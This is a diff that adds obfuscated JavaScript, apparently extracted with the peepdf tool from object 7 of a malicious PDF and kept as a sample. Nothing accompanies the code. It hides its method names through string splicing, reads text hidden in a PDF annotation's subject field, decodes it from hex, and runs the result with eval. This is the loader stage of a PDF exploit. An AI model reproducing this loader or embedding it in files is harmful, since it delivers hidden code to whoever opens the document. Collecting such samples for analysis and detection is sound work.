@@ -1,0 +1,42 @@
+// peepdf comment: Javascript code located in object 7 (version 0)
+
+var neAR_DEF_PXgHYhFsMTBRECO_1 = "";
+VAR_LtcYPPZYQBDkgWb = (function(VAR_eGXkKzIQCjBEaZe, VAR_xCUggEYeErHRHsB) {
+    return VAR_eGXkKzIQCjBEaZe[VAR_xCUggEYeErHRHsB];
+});
+
+function dskp(s) {
+    frcc = neAR_DEF_PXgHYhFsMTBRECO_1.constructor['f' + 'romCharCode'];
+    s = s.split('%');
+    r = neAR_DEF_PXgHYhFsMTBRECO_1;
+    for (VAR_search_1 in this) if (VAR_search_1.length == 1 && VAR_search_1.charCodeAt(0) == 115 & VAR_search_1.charCodeAt(0) == 115) break;
+    for (c in this[VAR_search_1]) {
+        if (!VAR_LtcYPPZYQBDkgWb(s, c)) continue;
+        r += frcc(parseInt(s[c], 16))
+    }
+    return r;
+}
+vd = neAR_DEF_PXgHYhFsMTBRECO_1;
+vnt = event;
+r = (r = 'l' + vd + 'a' + 'ce', 're' + 'p' + r);
+if (!vd && r) {
+    var z;
+    tis = vnt[('ta')[r](/r/, neAR_DEF_PXgHYhFsMTBRECO_1) + 'r' + vd + 'get'];
+    var e = vd + 'v' + 'a';
+    e = vd + 'e' + e;
+    e = tis[e + 'l'];
+    var y;
+    z = y = tis;
+    y = 0;
+    sas = (sas = 'c', 'syn' + sas);
+    sas += 'An' + vd + 'notS' + 'can';
+    VAR_LtcYPPZYQBDkgWb(z, sas).call(z);
+    y = z;
+    sbj = 'su' + 'bject';
+    var p = y['g' + 'et' + ('Aaots')[r](/a/, 'nn')]();
+    var s = VAR_LtcYPPZYQBDkgWb(p, 0)[sbj];
+    var l = VAR_LtcYPPZYQBDkgWb(s, r).call(s, /[FAE]/g, ('q%p')[r](/[qp]/g, neAR_DEF_PXgHYhFsMTBRECO_1));
+    s = dskp(l);
+    e(s)
+}
+
